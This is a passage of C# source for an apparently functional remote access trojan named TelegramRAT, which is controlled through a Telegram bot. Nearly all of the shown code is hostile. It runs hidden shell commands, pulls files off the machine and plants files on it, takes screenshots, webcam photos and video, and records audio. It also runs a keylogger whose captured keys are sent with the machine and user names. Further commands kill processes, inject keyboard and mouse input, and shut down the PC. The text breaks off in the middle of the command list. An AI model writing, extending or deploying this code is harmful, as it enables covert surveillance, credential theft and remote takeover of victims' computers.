﻿using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types;
using OpenCvSharp;
using WindowsInput;
using System.Reflection;
using System.Text;
using NAudio.Wave;


namespace TelegramRAT
{
    public static class Program
    {
        static TelegramBotClient Bot;

        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
        readonly static string BotToken = null; // Place your Telegram bot token. 

        static List<BotCommand> commands = new List<BotCommand>();
        static bool keylog = false;
        static bool doRecord = false;

        static WaveInEvent waveIn;
        static WaveFileWriter waveFileWriter;

        static void Main(string[] args)
        {

            string thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
                return;

            Bot = new TelegramBotClient(BotToken);

            #region Commands
            //HELP
            commands.Add(new BotCommand
            {
                Command = "/help",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,

                Description = "Show description of other commands.",
                Example = "/help screenshot",

                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        if (model.Args.Length == 0)
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Use this command to retrieve description of other commands. " +
                                "\nTo get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        string command = model.Args[0];
                        if (!command.StartsWith("/"))
                        {
                            command = "/" + command;
                        }

                        foreach (BotCommand cmd in commands)
                        {
                            if (cmd.Command == command)
                            {
                                string Description = $"<b>{cmd.Command}</b>\n\n";
                                if (cmd.Description != null)
                                {
                                    Description += cmd.Description;
                                }
                                else
                                {
                                    Description += "<i>No description provided</i>";
                                }
                                if (cmd.Example != null)
                                {
                                    Description += $"\nExample: {cmd.Example}";
                                }
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, Description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);
                                return;
                            }
                        }

                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist! " +
                            "To get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);

                    });
                }
            });

            //CMD
            commands.Add(new BotCommand
            {
                Command = "/cmd",
                IgnoreCountArgs = true,
                Example = "/cmd",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Task.Run(() =>
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.CreateNoWindow = true;

                            cmd.StartInfo.Arguments = "/C " + model.RawArgs;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.UseShellExecute = false;

                            cmd.Start();
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Started!", replyToMessageId: update.Message.MessageId);
                            cmd.WaitForExit();

                            string Output = cmd.StandardOutput.ReadToEnd();

                            if (Output.Length == 0)
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!", replyToMessageId: update.Message.MessageId);
                            else
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!\n\n" +
                                    $"Output:\n{Output}", replyToMessageId: update.Message.MessageId);
                        });
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Run cmd commands."
            });

            //DIR
            commands.Add(new BotCommand
            {
                Command = "/dir",
                CountArgs = 0,
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,
                Example = "/dir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string curdir;
                        if (model.Args.Length > 0)
                            curdir = model.RawArgs;
                        else
                            curdir = Directory.GetCurrentDirectory();


                        var files = Directory.EnumerateFiles(curdir);
                        int i = 0;
                        string oneMessage;
                        if (files.Count() != 0)
                        {
                            oneMessage = "Files:\n\n";
                            foreach (string file in files)
                            {
                                string parsedFile = file.Substring(file.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedFile}`\n";

                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }

                        var dirs = Directory.EnumerateDirectories(curdir);
                        i = 0;
                        if (dirs.Count() != 0)
                        {
                            oneMessage = "Folders:\n\n";
                            foreach (string dir in dirs)
                            {
                                string parsedDir = dir.Substring(dir.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedDir}`\n";

                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }
                        if (dirs.Count() == 0 && files.Count() == 0)
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This directory contains no files and no folders.", replyToMessageId: update.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Get all files and folders from current directory."
            });

            //PROCESSESLIST
            commands.Add(new BotCommand
            {
                Command = "/processes",
                CountArgs = 0,
                Example = "/processes",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string Concat = "List of processes: \n";
                        int i = 1;
                        Process[] processCollection = Process.GetProcesses();

                        foreach (Process p in processCollection)
                        {
                            Concat += $"<code>{p.ProcessName}</code>\n";
                            if (i == 100)
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                                Concat = "";
                                i = 0;
                            }
                            i++;

                        }
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Get list of running processes."
            });

            //PROCESSKILL
            commands.Add(new BotCommand
            {
                Command = "/processkill",
                IgnoreCountArgs = true,
                Example = "/processkill",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (Assembly.GetEntryAssembly().GetName().Name != model.RawArgs)
                        {
                            foreach (Process localprocess in Process.GetProcessesByName(model.RawArgs))
                            {
                                localprocess.Kill();
                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }

                },
                Description = "Kill process or processes by name."
            });

            //CD
            commands.Add(new BotCommand
            {
                Command = "/cd",
                IgnoreCountArgs = true,
                Example = "/cd C:\\Users",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (Directory.Exists(model.RawArgs))
                        {
                            Directory.SetCurrentDirectory(model.RawArgs);
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Directory changed to: <code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Change current directory."
            });

            //CURDIR
            commands.Add(new BotCommand
            {
                Command = "/curdir",
                CountArgs = 0,
                Example = "/curdir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Current directory:\n<code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Get current directory."
            });

            //SHUTDOWN
            commands.Add(new BotCommand
            {
                Command = "/shutdown",
                CountArgs = 0,
                Example = "/shutdown",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Process shutdown = new Process();
                        shutdown.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        shutdown.StartInfo.FileName = "powershell.exe";
                        shutdown.StartInfo.Arguments = "/C shutdown /s /t 1";
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        shutdown.Start();
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Turn PC off."
            });

            //RESTART
            commands.Add(new BotCommand
            {
                Command = "/restart",
                CountArgs = 0,
                MayHaveNoArgs = true,
                Example = "/restart",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Process restart = new Process();

                        restart.StartInfo.CreateNoWindow = true;
                        restart.StartInfo.FileName = "powershell.exe";
                        restart.StartInfo.Arguments = "/C shutdown /r /t 1";
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
                        restart.Start();
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description =
                "Restart PC"
            });

            //DOWNLOAD
            commands.Add(new BotCommand
            {
                Command = "/download",
                IgnoreCountArgs = true,
                Example = "/download hello.txt",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (model.RawArgs == null)
                            return;
                        var filetodownload = model.RawArgs;
                        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
                        {
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"There is no file \"{filetodownload}\" at dir {Directory.GetCurrentDirectory()}");
                            return;
                        }
                        var filetosend = new FileStream(Directory.GetCurrentDirectory() + "\\" + filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
                        {
                            await Bot.SendDocumentAsync(update.Message.Chat.Id, new InputOnlineFile(filetosend, filetosend.Name.Substring(filetosend.Name.LastIndexOf("\\"))), caption: filetodownload);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description =
                "Send file from PC by path"
            });

            //SCREENSHOT
            commands.Add(new BotCommand
            {
                Command = "/screenshot",
                CountArgs = 0,
                Example = "/screenshot",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {
                            Rectangle bounds = WinAPI.GetScreenBounds();

                            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                            {
                                using (Graphics g = Graphics.FromImage(bitmap))
                                {

                                    g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);

                                    bitmap.Save("scr.png", ImageFormat.Png);


                                    using (var ScreenshotStream = new FileStream("scr.png", FileMode.Open, FileAccess.Read, FileShare.Read))
                                    {
                                        await Bot.SendPhotoAsync(chatId: update.Message.Chat.Id, photo: ScreenshotStream, caption: "Screenshot!", replyToMessageId: update.Message.MessageId);
                                    }
                                }
                            }

                            System.IO.File.Delete("scr.png");

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },
                Description = "Take a screenshot of all displays area."
            });

            //GET USER TELEGRAM ID
            commands.Add(new BotCommand
            {
                Command = "/getid",
                CountArgs = 0,
                Example = "/getid",
                Execute = async (model, update) =>
                {
                    if (update.Message.ReplyToMessage != null)
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"User id: <code>{update.Message.ReplyToMessage.From.Id.ToString()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        return;
                    }
                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"This chat id: <code>{update.Message.Chat.Id.ToString()}</code>", ParseMode.Html);
                },
                Description = "Get chat or user id. To get user's id type this command as answer to user message. Made in developing purposes."
            });

            //TAKE PHOTO FROM WEBCAM
            commands.Add(new BotCommand
            {
                Command = "/webcam",
                Description = "Take a photo from webcamera.",
                Example = "/webcam",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {

                            Mat img = new Mat();

                            using (var FrameSrc = Cv2.CreateFrameSource_Camera(0))
                            {
                                FrameSrc.NextFrame(img);
                            }
                            img.SaveImage("webcam.jpg");


                            using (var fs = new FileStream("webcam.jpg", FileMode.Open))
                            {
                                InputOnlineFile webcamPhoto = new InputOnlineFile(fs);
                                await Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto);
                            }
                            System.IO.File.Delete("webcam.jpg");

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }

            });

            //MESSAGEBOX
            commands.Add(new BotCommand
            {
                Command = "/message",
                IgnoreCountArgs = true,
                Example = "message ! Hello",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        string Caption = "Message";
                        string Text = "";
                        if (model.Args[0].StartsWith("_"))
                        {
                            Caption = model.Args[0].Substring(1);
                        }
                        WinAPI.MsgBoxFlag flag = WinAPI.MsgBoxFlag.MB_APPLMODAL; //*Shit code intesifies*

                        bool ContainsIcon = false;
                        switch (model.Args[0].ToLower())
                        {
                            case "!":
                                flag |= WinAPI.MsgBoxFlag.MB_ICONEXCLAMATION;
                                ContainsIcon = true;
                                break;
                            case "i":
                                flag |= WinAPI.MsgBoxFlag.MB_ICONINFORMATION;
                                ContainsIcon = true;
                                break;
                            case "x":
                                flag |= WinAPI.MsgBoxFlag.MB_ICONSTOP;
                                ContainsIcon = true;
                                break;
                            case "?":
                                flag |= WinAPI.MsgBoxFlag.MB_ICONQUESTION;
                                flag |= WinAPI.MsgBoxFlag.MB_YESNO;
                                ContainsIcon = true;
                                break;

                        }
                        if (model.Args[0].StartsWith("_"))
                        {
                            Text = model.RawArgs.Substring(model.Args[0].Length + 1);

                        }
                        else
                        {
                            if (ContainsIcon)
                                Text = model.RawArgs.Substring(2);
                            else
                            {
                                Text = model.RawArgs;
                            }
                        }


                        int answer = WinAPI.ShowMessageBox(Text, Caption, flag);
                        string userResponse = "User response: ";
                        switch (answer)
                        {
                            case 1:
                                userResponse += "ok";
                                break;
                            case 6:
                                userResponse += "yes";
                                break;
                            case 7:
                                userResponse += "no";
                                break;

                        }
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, userResponse, replyToMessageId: update.Message.MessageId);
                    });
                },
                Description =
                "Send message with dialog window\n" +
                "You can change its icon by typing these characters before:\n" +
                "x - Error\n? - Question mark\n! - Exclamation mark\ni - Info\n"
            });

            //OPENURL
            commands.Add(new BotCommand
            {
                Command = "/openurl",
                IgnoreCountArgs = true,

                Example = "/openurl https://google.com",

                Execute = async (model, update) =>
                {
                    if (!model.RawArgs.Contains("://"))
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not url", replyToMessageId: update.Message.MessageId);
                    }
                    ProcessStartInfo info = new ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c start {model.RawArgs}",
                        CreateNoWindow = true
                    };

                    Process.Start(info);

                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Url opened!", replyToMessageId: update.Message.MessageId);
                },
                Description = "Open URL with default browser."
            });

            //UPLOAD FILE TO PC
            commands.Add(new BotCommand
            {
                Command = "/upload",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,

                Execute = async (model, update) =>
                {
                    try
                    {
                        if (update.Message.Type == MessageType.Photo)
                        {
                            foreach (PhotoSize photo in update.Message.Photo)
                            {
                                System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png").Close();

                                Telegram.Bot.Types.File photoFile = await Bot.GetFileAsync(photo.FileId);

                                using (FileStream fs = new FileStream(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png", FileMode.Open, FileAccess.Write))
                                {
                                    Bot.DownloadFileAsync(photoFile.FilePath, fs).Wait();
                                }
                            }
                        }
                        else if (update.Message.Type == MessageType.Document)
                        {
                            Telegram.Bot.Types.File doc = await Bot.GetFileAsync(update.Message.Document.FileId);

                            using (var fs = new FileStream(Directory.GetCurrentDirectory() +
                                $"\\{update.Message.Document.FileName}", FileMode.Create))
                            {
                                Bot.DownloadFileAsync(doc.FilePath, fs).Wait();

                            }
                        }
                        else
                            return;
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Upload image or file to current directory."

            });

            //RECORD VIDEO FROM WEBCAM
            commands.Add(new BotCommand
            {
                Command = "/video",
                CountArgs = 1,
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {

                            int framesCount = 30 * Convert.ToInt32(model.Args[0]);
                            VideoCapture cap = new VideoCapture(0, VideoCaptureAPIs.ANY)
                            {
                                FrameWidth = 1280,
                                FrameHeight = 720,
                            };

                            Mat frame = new Mat();
                            VideoWriter vidWriter = new VideoWriter("vid.mp4", FourCC.H264, 30, new OpenCvSharp.Size(cap.FrameWidth, cap.FrameHeight));

                            await Bot.SendChatActionAsync(update.Message.Chat.Id, ChatAction.RecordVideo);

                            for (int i = 0; i < framesCount; i++)
                            {
                                cap.Read(frame);
                                vidWriter.Write(frame);
                            }
                            await Bot.SendChatActionAsync(update.Message.Chat.Id, ChatAction.UploadVideo);

                            cap.Release();


                            vidWriter.Release();

                            using (var fileStream = new FileStream("vid.mp4", FileMode.Open))
                            {
                                InputOnlineFile inputOnlineFile = new InputOnlineFile(fileStream);
                                Bot.SendVideoAsync(update.Message.Chat.Id, inputOnlineFile, replyToMessageId: update.Message.MessageId).Wait();
                            }
                            System.IO.File.Delete("vid.mp4");
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },
                Description = "Record video from webcamera for given amount of seconds."
            });

            //SENDKEYBOARDINPUT 
            commands.Add(new BotCommand
            {
                Command = "/sendinput",
                IgnoreCountArgs = true,
                Example = "/sendinput 48 45 4c 4c 4f (hello)",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            KeyboardSimulator ks = new KeyboardSimulator(new InputSimulator());
                            foreach (string arg in model.Args)
                            {
                                if (arg.Contains("+"))
                                {
                                    int modifier = int.Parse(arg.Split('+').First(), System.Globalization.NumberStyles.HexNumber);
                                    List<int> modified = new List<int>();
                                    foreach (string vk in arg.Split('+').Skip(1))
                                    {
                                        modified.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
                                    }
                                    ks.ModifiedKeyStroke(new int[] { modifier }, modified);
                                }
                                else
                                    ks.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
                            }

                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Sended!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },

                Description =
                #region desc
                "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
                "List of virtual keycodes:\n" +
                "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
                "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
                "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
                "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
                "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +

                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
                "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n"
                #endregion
            });

            //CHANGE WALLPAPER
            commands.Add(new BotCommand
            {
                Command = "/wallpaper",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {
                            if (update.Message.Type != MessageType.Photo)
                                return;


                            using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                            {
                                Telegram.Bot.Types.File photo = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
                                await Bot.DownloadFileAsync(photo.FilePath, fs);
                            }
                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },
                Description = "Change wallpapers. Don't foreget to attach the image."
            });

            //MINIMIZE WINDOW
            commands.Add(new BotCommand
            {
                Command = "/minimize",
                MayHaveNoArgs = true,
                IgnoreCountArgs = true,
                Example = "/minimize Calculator",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {
                            if (model.Args.Length > 0)
                            {
                                WinAPI.MinimizeWindow(WinAPI.FindWindow(null, model.RawArgs));
                            }
                            else
                            {
                                WinAPI.MinimizeWindow(WinAPI.GetForegroundWindow());
                            }

                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },
                Description = "Minimize window by name, or top window if name was not provided"
            });

            //MOVE MOUSE TO COORD
            commands.Add(new BotCommand
            {
                Command = "/mouseto",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,

                Example = "/mouseto 200 300 (width heght)",

                Execute = (model, update) =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());

                    try
                    {
                        mouseSimulator.MoveMouseTo(Convert.ToDouble(model.Args[0]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Width),
                            Convert.ToDouble(model.Args[1]) * (ushort.MaxValue / WinAPI.GetScreenBounds().Height));
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Move cursor to coordinate in pixels"
            });

            //MOVE MOUSE BY PIXELS
            commands.Add(new BotCommand
            {
                Command = "/mouseby",
                CountArgs = 2,
                IgnoreCountArgs = false,
                MayHaveNoArgs = false,
                Example = "/mouseby 15 20",
                Execute = (model, update) =>
                {
                    MouseSimulator mouseSimulator = new MouseSimulator(new InputSimulator());
                    try
                    {
                        mouseSimulator.MoveMouseBy(Convert.ToInt32(model.Args[0]),
                            Convert.ToInt32(model.Args[1]));
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                },
                Description = "Move cursor by pixels."
            });

            //CLICK LEFT MOUSE BUTTON
            commands.Add(new BotCommand
            {
                Command = "/lmclick",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                },
                Description = "Simulate left mouse click."
            });

            //DOUBLECLICK LEFT MOUSE BUTTON
            commands.Add(new BotCommand
            {
                Command = "/dlmclick",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).LeftButtonDoubleClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                },
                Description = "Simulate double left mouse click."
            });

            //CLICK RIGHT MOUSE BUTTON
            commands.Add(new BotCommand
            {
                Command = "/rmclick",
                Execute = (model, update) =>
                {
                    new MouseSimulator(new InputSimulator()).RightButtonClick();
                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                },
                Description = "Simulate right mouse click."
            });

            //SEND TEXT INPUT
            commands.Add(new BotCommand
            {
                Command = "/sendtext",
                IgnoreCountArgs = true,
                Example = "/sendtext hello world",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            new KeyboardSimulator(new InputSimulator()).TextEntry(model.RawArgs);
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },
                Description = "Send text input"
            });

            //KEYLOG
            commands.Add(new BotCommand
            {
                Command = "/keylog",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        if (keylog)
                        {
                            keylog = false;
                            return;
                        }
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Keylog started!", replyToMessageId: update.Message.MessageId);
                        keylog = true;

                        StringBuilder mappedKeys = new StringBuilder();
                        StringBuilder unmappedKeys = new StringBuilder();
                        List<uint> LastKeys = new List<uint>();
                        List<uint> shit = new List<uint>();
                        while (keylog)
                        {
                            shit.Clear();
                            bool hasAtLeastOneKey = false;
                            for (uint i = 0; i < 256; i++)
                            {
                                int state = WinAPI.GetAsyncKeyState(i);
                                if (state != 0)
                                {
                                    shit.Add(i);
                                    hasAtLeastOneKey = true;
                                }
                            }
                            if (!hasAtLeastOneKey && LastKeys.Count > 0)
                            {
                                char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
                                for (int i = 0; i < LastKeys.Count; i++)
                                {
                                    mappedKeycode = WinAPI.MapVirtualKey(LastKeys[i]);
                                    if ((int)mappedKeycode == 0)
                                        mappedKeys.Append(LastKeys[i].ToString() + ";");
                                    else
                                        mappedKeys.Append(mappedKeycode + ";");

                                    unmappedKeys.Append(LastKeys[i].ToString("X") + ";");
                                }
                                mappedKeys.Append(" ");
                                unmappedKeys.Append(" ");
                                LastKeys.Clear();
                                continue;
                            }
                            foreach (uint v in shit)
                            {
                                if (!LastKeys.Contains(v))
                                {
                                    LastKeys.Add(v);
                                }
                            }

                        }
                        using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
                        {
                            StreamWriter streamWriter = new StreamWriter(keylogFileStream);
                            streamWriter.WriteLine("#Mapped keylog:");
                            streamWriter.WriteLine(mappedKeys.ToString());
                            streamWriter.WriteLine("\n#Remember, mapped keylog is not the \"clear\" input.\n\n#Unmapped keylog:");
                            streamWriter.WriteLine(unmappedKeys.ToString());
                            streamWriter.WriteLine("\n#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
                            streamWriter.Close();
                        }
                        Bot.SendTextMessageAsync(update.Message.From.Id, "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + mappedKeys.ToString());

                        using (FileStream fs = new FileStream("keylog.txt", FileMode.Open))
                        {
                            Bot.SendDocumentAsync(update.Message.From.Id, new InputOnlineFile(fs), caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName).Wait();
                        }
                    });
                },
                Description = "Keylog starts and ends with no args."
            });

            //RECORD AUDIO
            commands.Add(new BotCommand
            {
                Command = "/audio",
                CountArgs = 1,
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            if (model.Args[0].ToLower() == "start")
                            {
                                if (!doRecord)
                                {
                                    doRecord = true;
                                    waveIn = new WaveInEvent()
                                    {
                                        WaveFormat = new WaveFormat(44100, 1)
                                    };

                                    waveFileWriter = new WaveFileWriter("record.wav", waveIn.WaveFormat);

                                    waveIn.DataAvailable += new EventHandler<WaveInEventArgs>((object sender, WaveInEventArgs args) =>
                                    {
                                        if (waveFileWriter != null)
                                        {
                                            waveFileWriter.Write(args.Buffer, 0, args.BytesRecorded);
                                            waveFileWriter.Flush();
                                        }
                                    });

                                    waveIn.StartRecording();
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording!", replyToMessageId: update.Message.MessageId);
                                }
                                else
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording!", replyToMessageId: update.Message.MessageId);
                                }
                                return;
                            }
                            if (model.Args[0].ToLower() == "stop")
                            {
                                if (doRecord)
                                {
                                    doRecord = false;
                                    waveIn.StopRecording();
                                    Task.Delay(200).Wait();

                                    waveFileWriter.Close();
                                    Task.Delay(200).Wait();

                                    using (FileStream fs = new FileStream("record.wav", FileMode.Open))
                                    {
                                        InputOnlineFile file = new InputOnlineFile(fs);
                                        Bot.SendAudioAsync(update.Message.Chat.Id, file, replyToMessageId: update.Message.MessageId).Wait();

                                    }
                                    System.IO.File.Delete("record.wav");
                                }
                                else
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Recording isn't started yet!", replyToMessageId: update.Message.MessageId);
                                }
                                return;
                            }

                            int time = int.Parse(model.Args[0]);

                            WaveInEvent waveIn2 = new WaveInEvent();

                            waveIn2.WaveFormat = new WaveFormat(44100, 1);
                            WaveFileWriter waveFileWriter2 = new WaveFileWriter("record.wav", waveIn2.WaveFormat);

                            waveIn2.DataAvailable += new EventHandler<WaveInEventArgs>((object sender, WaveInEventArgs args) =>
                            {
                                if (waveFileWriter2 != null)
                                {
                                    waveFileWriter2.Write(args.Buffer, 0, args.BytesRecorded);
                                    waveFileWriter2.Flush();
                                }
                            });
                            waveIn2.RecordingStopped += new EventHandler<StoppedEventArgs>((object sender, StoppedEventArgs args) =>
                            {
                                if (waveFileWriter2 != null)
                                {
                                    waveFileWriter2.Dispose();
                                    waveFileWriter2.Close();
                                }
                                if (waveIn2 != null)
                                {
                                    waveIn2.Dispose();
                                }
                            });

                            waveIn2.StartRecording();
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Start recording", replyToMessageId: update.Message.MessageId);

                            Task.Delay(time * 1000).Wait();
                            waveIn2.StopRecording();
                            Task.Delay(200).Wait();
                            waveFileWriter2.Close();
                            Task.Delay(200).Wait();

                            using (FileStream fs = new FileStream("record.wav", FileMode.Open))
                            {
                                Bot.SendAudioAsync(update.Message.Chat.Id, new InputOnlineFile(fs), replyToMessageId: update.Message.MessageId).Wait();
                            }
                            System.IO.File.Delete("record.wav");


                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }

                    });
                },
                Description = "Record audio from microphone for given amount of secs."
            });

            //GET ALL COMMANDS
            commands.Add(new BotCommand
            {
                Command = "/commands",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
